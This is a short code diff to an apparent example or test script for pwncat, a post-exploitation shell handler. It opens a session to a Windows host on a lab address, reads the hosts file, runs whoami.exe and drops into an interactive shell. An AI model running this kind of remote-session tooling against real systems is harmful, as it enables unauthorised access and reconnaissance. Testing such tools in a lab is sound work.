@@ -11,17 +11,17 @@ manager = pwncat.manager.Manager("data/pwncatrc")
 # Establish a session
 session = manager.create_session("windows", host="192.168.122.11", port=4444)
 
-manager.interactive()
-
-# hosts = (
-#     session.platform.Path("C:\\") / "Windows" / "System32" / "drivers" / "etc" / "hosts"
-# )
-# with hosts.open() as filp:
-#     manager.log("Read etc hosts:")
-#     manager.log(filp.read())
-#
-# p = session.platform.Popen(["whoami.exe"], stdout=subprocess.PIPE, text=True)
-# manager.log(f"Current user: {p.communicate()[0].strip()}")
-# manager.log(f"Process Exit Status: {p.returncode}")
-#
 # manager.interactive()
+
+hosts = (
+    session.platform.Path("C:\\") / "Windows" / "System32" / "drivers" / "etc" / "hosts"
+)
+with hosts.open() as filp:
+    manager.log("Read etc hosts:")
+    manager.log(filp.read())
+
+p = session.platform.Popen(["whoami.exe"], stdout=subprocess.PIPE, text=True)
+manager.log(f"Current user: {p.communicate()[0].strip()}")
+manager.log(f"Process Exit Status: {p.returncode}")
+
+manager.interactive()
